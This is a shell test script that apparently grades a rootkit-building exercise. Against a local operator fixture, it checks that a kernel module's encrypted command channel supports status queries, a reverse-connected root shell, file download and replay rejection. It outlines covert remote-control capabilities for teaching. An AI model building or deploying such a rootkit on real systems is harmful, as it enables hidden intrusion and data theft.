#!/bin/sh
# Check: all 8 M04 commands over AES-256-GCM encrypted channel.
# Uses secure_agent_fixture in serve-basic mode as the operator.
# shellcheck source=/dev/null
. "${RKLINGS_LIB:-/vm/checks/lib.sh}"

begin "Remote control over encrypted channel"

ifconfig lo 127.0.0.1 up 2>/dev/null

KEY="000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
MARKER_DIR=/tmp/rk_fixture_m04
rm -rf "$MARKER_DIR"
mkdir -p "$MARKER_DIR"

printf 'rootkitlings download test\n' > /tmp/rktest.txt

secure_agent_fixture serve-basic "$MARKER_DIR" 4444 127.0.0.1 "$KEY" &
FIXTURE_PID=$!

# Wait for the fixture to bind
while [ ! -f "$MARKER_DIR/ready" ]; do sleep 0.1; done
_ok "fixture listening"

load rklings.ko control_key="$KEY" peer_address=127.0.0.1 peer_port=4444

# Wait for the basic command tests
_hdr "Basic commands (STATUS, INFO, QUIT)"
i=0; while [ ! -f "$MARKER_DIR/basic_complete" ] && [ "$i" -lt 100 ]; do
    sleep 0.1; i=$((i + 1))
done
if [ -f "$MARKER_DIR/basic_complete" ]; then
    _ok "STATUS, INFO, unknown-command, QUIT passed"
else
    _fail "basic commands timed out"
fi

_hdr "SHELL with ticket-based reverse connect"
i=0; while [ ! -f "$MARKER_DIR/shell_complete" ] && [ "$i" -lt 200 ]; do
    sleep 0.1; i=$((i + 1))
done
if [ -f "$MARKER_DIR/shell_complete" ]; then
    _ok "SHELL ticket, reverse connect, root PTY verified"
else
    _fail "SHELL test timed out"
fi

_hdr "DOWNLOAD encrypted file transfer"
i=0; while [ ! -f "$MARKER_DIR/download_complete" ] && [ "$i" -lt 100 ]; do
    sleep 0.1; i=$((i + 1))
done
if [ -f "$MARKER_DIR/download_complete" ]; then
    _ok "DOWNLOAD and error path verified"
else
    _fail "DOWNLOAD test timed out"
fi

_hdr "Replay rejection"
i=0; while [ ! -f "$MARKER_DIR/replay_rejected" ] && [ "$i" -lt 100 ]; do
    sleep 0.1; i=$((i + 1))
done
if [ -f "$MARKER_DIR/replay_rejected" ]; then
    _ok "replayed sequence number rejected"
else
    _fail "replay rejection timed out"
fi

# Wait for fixture to exit
wait "$FIXTURE_PID" 2>/dev/null
fixture_rc=$?
if [ "$fixture_rc" -eq 0 ]; then
    _ok "fixture completed successfully"
else
    _fail "fixture exited with code $fixture_rc"
fi

rm -f /tmp/rktest.txt
rm -rf "$MARKER_DIR"

unload rklings
assert_absent /sys/module/rklings

summary
